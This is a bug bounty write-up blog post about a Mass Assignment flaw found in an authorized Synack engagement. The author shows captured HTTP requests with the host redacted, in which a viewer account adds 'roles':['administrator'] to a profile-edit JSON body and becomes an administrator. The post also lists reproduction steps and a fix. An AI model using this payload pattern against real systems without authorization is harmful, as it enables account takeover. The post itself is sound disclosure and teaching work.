---
layout: single
title: Mass Assignment exploitation in the wild - Escalating privileges in style
date: 2021-05-14
classes: wide
thumbnail: https://galnagli.com/images/Mass-Assignment.jpg
header: https://galnagli.com/images/Mass-Assignment.jpg
header:
  teaser: /images/Mass-Assignment.jpg
--- 

![preview](/images/Mass-Assignment.jpg)

## General

As I have been accepted to Synack's Red Team at the beginning of march, the opportunity emerged required me and other bounty hunters to conduct a "mental shift", as most of the lucrative bounty programs on the public platforms will be the wildcard scoped ones, it's mostly the contrary while hunting on Synack.

Working with the model of "QR" periods, most hunters will receive 2~3 new application testing invites each week which starts with 8 hours Quallity Rule, meaning it's not about being the first to report the issue, it's about the best report and as many vulnerable parameters invovled.

those invites mostly invlove a post-authentication webapp testing for a certain functioniality of big organizations.

As mostly conduct the first security engagement of the supplied application, it often exposes some unique vulnerabilities and attack vectors to explore.

During one of those engagements I managed to find a Mass Assignment vulnerability, which helped me escalate privileges from normal user without any permissions to a fully permissive administrator account.



### Mass Assignment

As the vulnerability of "Mass Assignment" is not often talked about and there are not many writeups / disclosed reports of it, I'll briefly explain the core nature of it.

as per [OWASP](https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html)

```
Software frameworks sometime allow developers to automatically bind HTTP request parameters into program code variables or objects to make using that framework easier on developers. This can sometimes cause harm.

Attackers can sometimes use this methodology to create new parameters that the developer never intended which in turn creates or overwrites new variable or objects in program code that was not intended.
```

Adding to that, as per [OWASP API top 10](https://owasp.org/www-project-api-security/), Mass Assignment is ranked at the 6th place, following it's definition:

```
Binding client provided data (e.g., JSON) to data models, without proper properties filtering based on an allowlist, usually leads to Mass Assignment. Either guessing objects properties, exploring other API endpoints, reading the documentation, or providing additional object properties in request payloads, allows attackers to modify object properties they are not supposed to.
```


To understand the attack vector better, let's take a look at the following image: 

![Mass_assignment_example](/images/Mass_Example.png)

[credit](https://global-uploads.webflow.com/5ffc6b565fe11e76be021da1/602eda3ff4abd10d2e127f9c__56aRngXYuute5buEI-7RY2kkbixkjMPYxw1_dX0D_t863mTh6kwzlZTCKrOuNGpmKVRg-1_hWgXDiqk4-ddN5bV8ZM-lkvfWgb2FOnN7WCGithAQ9Es-pl6x-s6UQ_NWgHSEMAu.png)

The image above demonstrates a scenario which was very similar to almost exact of my own finding.

as we can see from the image we are dealing with an API which accepts JSON objects from a client, those are common on API's when we want to update our account information, for example changing our phone number or email address.

We are being presented with a scheme which in most cases will be represented in a UI as text fields to fill before submitting the request by a button click, such as

```
address,email,first name and so on.
```

The user update panel often differs between normal user and administrator, as those often posess more functionalities to assist the site owner.
the displayed UI might look the same, but the JSON object submitted within the request might have additional sensitive parameters involved.


It's pretty clear now to see how the vulnerability exploitation will come along, as the sensitive fields are not presented to the regular user in his UI or upon his user update request,

There might be a misconfiguration in the Authorization model within the application which will accept the hidden JSON fields from none permissive user account and will process it as it was an administrator.

Taking it to the example above, imagine the user adds to his request the following key:value

```
"role":"admin"
```

As the server won't enforce any authorization check, the user will become an administrator in a sight of a single PUT request.

You might have wondered by now how can we as regular users without any permissions have guessed the hidden key:values pairs?

There are 2 main vectors to find those, which can be divided into "Blackbox" and "Whitebox" approach

### Blackbox Approach

As for the "Blackbox" testing, we can use Burp's [Param Miner](https://portswigger.net/bappstore/17d2949a985c4b7ca092728dba871943) extension, when we have HTTP request which sends data within JSON format, we are being presented with the "Guess JSON parameters" option, which will bruteforce for common JSON params and see if it affects the server response, by issuing the Param Miner probe we can guess for those hidden sensitive fields.

![json_param](/images/json_param.png)

### Whitebox Approach

If we are being presented within our testing with administrator credentials, we should navigate throught the supplied account, mostly into the profile update fields or new user invitations, mainly looking for those PUT or POST json based requests and note down the json parameters supplied in those.

Later, we should approach the application the same way with normal user account, by matching and comparing the json params available for none-permissive account to an administrator we can determine and craft payloads based on the differences.

## Exploitation

After going through the foreword, we can dive to actual vulnerability I managed to find during the application assesment.

As for certain application testing for a client within Synack, we were presented with a post-auth application with several user roles, there were editors, viewers and administrators.

As a general approach with like-wise application I'd look for potential endpoints which could be vulnerable to Privilege Escalation, as those often require studying the application behaviour and will most likely have less competition going over the Quality Rule results later on.

We were presented with administrator Account only throughout the following testing.

As I was navigating throughout the application, I found an endpoint which gave us the ability to invite new users to the our organization environment

```
https://example.com/app/users/addNew
```

Therfore I invited myself for an additional account with a "Viewer" permissions only, so I could conduct the testing in an efficent manner.

![user-invite](/images/user-invite.png)

Logging into the new user I have created, I went to my personal profile page, located at

```
https://example.com/app/profile
```

We were presented with 3 fields only

```
Name, Email and Language
```

![user-profile](/images/user-profile.png)

Clicking on the "Save Changes" button presented us with the following HTTP request:

```
POST /web/api/user/v1/edit HTTP/1.1
Host: XXXXXXXXXXXXX
Connection: close
Content-Length: 184
sec-ch-ua: "Google Chrome";v="89", "Chromium";v="89", ";Not A Brand";v="99"
Accept: application/json, text/plain, */*
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36
Content-Type: application/json;charset=UTF-8
Origin: XXXXXXXXX
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: XXXXXXXX
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8,eu;q=0.7,he;q=0.6
Cookie: XXXXXXXX

{"uuid":"user UUID","updates":{"name":"NAME","email":"EMAIL","enabled":true}}

```

a JSON object with the fields presented at the UI, so it looks fine up to this point.

Going to the administrator account, I went to the same endpoint and issued the same request by clicking on the "Save Changes" button, only this time to see the following:

```
POST /web/api/user/v1/edit HTTP/1.1
Host: XXXXXXXXXXXXX
Connection: close
Content-Length: 184
sec-ch-ua: "Google Chrome";v="89", "Chromium";v="89", ";Not A Brand";v="99"
Accept: application/json, text/plain, */*
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36
Content-Type: application/json;charset=UTF-8
Origin: XXXXXXXXX
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: XXXXXXXX
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8,eu;q=0.7,he;q=0.6
Cookie: XXXXXXXX

{"uuid":"user UUID","updates":{"name":"NAME","email":"EMAIL","roles":["administrator"],"enabled":true}}
```

So this one was interesting, I was presented with the same UI on both requests, but this time when I approached further and saved my new profile details as the administrator there was an additional field presented, the "roles" one.

Although I didn't really believe that it would work, all I did was navigating to the "Viewer" user account, again capturing the "Save Changes" request, only this time adding the key-value pair of

```
"roles":["administrator"]
```

To the JSON object.

Upon issuing the POST request I could observe the 200 OK response, with the OK value - indiciating that the exploitation worked.

![response](/images/working_exploit.png)

And so it was, we managed to escalate from normal user to administrator account with a simple POST request on the user profile edit area.

You could have noticed that it was easier to find the sensitive hidden param from the Whitebox approach, although the parameter name is pretty common and could have been found with Param Miner on Blackbox testing aswell.

### Wrapping up the report

Concluding the exploitation above, those were the steps taken as it was stated in the original report:

- [x] Navigate to 

```
https://example.com/app/users/addNew
```

and add a new account with limited permissions

- [x] Log in with the new user account and navigate to

```
https://example.com/app/profile
```

Click on the "Save changes button" and capture the request

- [x] Add to the json scheme the following:

```
"updates":{"name":"hello","email":"your email","roles":["administrator"],"enabled":true}}
```

- [x] The user account has successfully escalated his privileges to administrator's one.

### Recommended fix

In order to block mass assignments vulnerabilities, there is great cheatsheet here:

[Owasp Cheatsheet](https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html)

In more depth way to our own vulnerability, we should ensure that the roles parameter is binded to the administrator account, we can't allow it to be reached by normal users to tamper with, either do not allow the user accounts to add any other params rather than it's name when he want to update his profile.

### Conclusion

The Quality Period for this specific application assesment had 40 reports submitted within the first 8 hours of the engagement

I was the only one who reported this specific privilege escalation issue leverging the Mass Assignment vulnerability.

It had a CVSS score of 8.1 and had received additional criticality bonus.

![bonus](/images/critical_bonus.png)

![reward](/images/mass_reward.png)


### Report Timeline

- [x] April 15th 14:00 GMT - Report Submitted
- [x] April 16th 00:20 GMT - Report accepted and Rewarded
- [x] April 16th 12:44 GMT - Critical bonus awarded


## Thanks for sticking out!

Some Social Links:

- [x] Twitter: <https://twitter.com/naglinagli>
- [x] HackerOne: <https://hackerone.com/nagli>
- [x] Bugcrowd: <https://bugcrowd.com/Nagli>
- [x] Linkedin: <https://www.linkedin.com/in/galnagli>

